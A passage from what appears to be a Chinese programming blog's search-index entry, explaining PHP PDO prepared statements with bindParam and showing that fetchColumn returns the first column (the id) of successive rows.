<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    $sql_query &#x3D; &quot;select * from users where id&gt;(:id)&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pre2 &#x3D; $pdo -&gt; prepare($sql_query); &#x2F;&#x2F;准备要执行的SQL语句并返回一个 PDOStatement 对象</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pre2 -&gt; bindParam(&#39;:id&#39;,$id,PDO::PARAM_INT); &#x2F;&#x2F;绑定参数，想成是把:id的值替换成$id变量里的值</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $id &#x3D; $_GET[&#39;id&#39;]; &#x2F;&#x2F;获取GET请求过来的ID值</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pre2 -&gt; execute(); &#x2F;&#x2F;执行这个SQL语句</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print_r($pre2 -&gt; fetchColumn());</span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo &quot;&lt;br &#x2F;&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print_r($pre2 -&gt; fetchColumn());</span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo &quot;&lt;br &#x2F;&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    foreach ($row as $key)&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print_r($key);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        echo &quot;&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
<p><strong>返回的结果：</strong><br><img src="http://static.zybuluo.com/1kbfree/ch7tahy8vqlsto9y435y70to/image_1cc3qquka1ivlaih137a1mktil8m.png" alt="image_1cc3qquka1ivlaih137a1mktil8m.png-171.1kB"></p>
<p><strong>对比数据库里的数据来看:</strong><br><img src="http://static.zybuluo.com/1kbfree/xn7aufzmt60mpzamezayo6y1/image_1cc3qrn5p1f5s2m1n70rm41cr913.png" alt="image_1cc3qrn5p1f5s2m1n70rm41cr913.png-26.1kB"></p>
<p><em>我们可以看到这个<code>fetchColumn()</code>就是返回数据库里的第一列的数据，这里的第一列是Id，而且我打印了2次，所以对应的输出为7、1，这个结果相当于$row[‘id’]</em></p>
<hr>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
</search>
